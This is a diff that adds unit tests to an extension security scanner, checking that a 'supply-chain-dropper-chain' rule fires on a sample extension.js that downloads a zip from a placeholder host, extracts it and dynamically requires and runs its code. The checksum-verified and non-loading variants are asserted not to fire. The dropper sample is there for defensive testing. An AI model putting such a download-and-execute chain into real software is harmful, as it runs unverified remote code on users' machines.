@@ -2244,5 +2244,69 @@ class ScannerTests(unittest.TestCase):
         self.assertNotIn("install-rating-mismatch", rule_ids)
 
 
+class SupplyChainDropperChainTests(unittest.TestCase):
+    def _scan(self, extension_js: str):
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"dropper-test","version":"1.0.0","main":"extension.js"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(extension_js, encoding="utf-8")
+            return scan_extension(root)
+
+    def test_download_extract_dynamic_load_fires_dropper_chain(self) -> None:
+        report = self._scan(
+            "const https = require('https');\n"
+            "const AdmZip = require('adm-zip');\n"
+            "const path = require('path');\n"
+            "async function update(dest) {\n"
+            "  const res = await fetch('https://cdn.example.net/payload.zip');\n"
+            "  require('fs').writeFileSync(dest, Buffer.from(await res.arrayBuffer()));\n"
+            "  const zip = new AdmZip(dest);\n"
+            "  zip.extractAllTo('/tmp/module', true);\n"
+            "  const plugin = require(path.join('/tmp/module', 'index.js'));\n"
+            "  plugin.run();\n"
+            "}\n"
+        )
+        rule_ids = {finding.rule_id for finding in report.findings}
+        self.assertIn("supply-chain-dropper-chain", rule_ids)
+        finding = next(f for f in report.findings if f.rule_id == "supply-chain-dropper-chain")
+        self.assertEqual(finding.evidence.get("evidence_class"), "correlated")
+        self.assertEqual(report.verdict, "suspicious")
+
+    def test_integrity_verified_installer_does_not_fire_dropper_chain(self) -> None:
+        report = self._scan(
+            "const AdmZip = require('adm-zip');\n"
+            "const crypto = require('crypto');\n"
+            "const path = require('path');\n"
+            "const EXPECTED_SHA256 = 'abc123';\n"
+            "async function update(dest) {\n"
+            "  const res = await fetch('https://cdn.example.net/tool.zip');\n"
+            "  const bytes = Buffer.from(await res.arrayBuffer());\n"
+            "  const digest = crypto.createHash('sha256').update(bytes).digest('hex');\n"
+            "  if (digest !== EXPECTED_SHA256) { throw new Error('checksum mismatch'); }\n"
+            "  require('fs').writeFileSync(dest, bytes);\n"
+            "  new AdmZip(dest).extractAllTo('/tmp/module', true);\n"
+            "  const plugin = require(path.join('/tmp/module', 'index.js'));\n"
+            "  plugin.run();\n"
+            "}\n"
+        )
+        rule_ids = {finding.rule_id for finding in report.findings}
+        self.assertNotIn("supply-chain-dropper-chain", rule_ids)
+
+    def test_literal_requires_do_not_fire_dropper_chain(self) -> None:
+        report = self._scan(
+            "const AdmZip = require('adm-zip');\n"
+            "async function update(dest) {\n"
+            "  const res = await fetch('https://cdn.example.net/data.zip');\n"
+            "  require('fs').writeFileSync(dest, Buffer.from(await res.arrayBuffer()));\n"
+            "  new AdmZip(dest).extractAllTo('/tmp/data', true);\n"
+            "}\n"
+        )
+        rule_ids = {finding.rule_id for finding in report.findings}
+        self.assertNotIn("supply-chain-dropper-chain", rule_ids)
+
+
 if __name__ == "__main__":
     unittest.main()
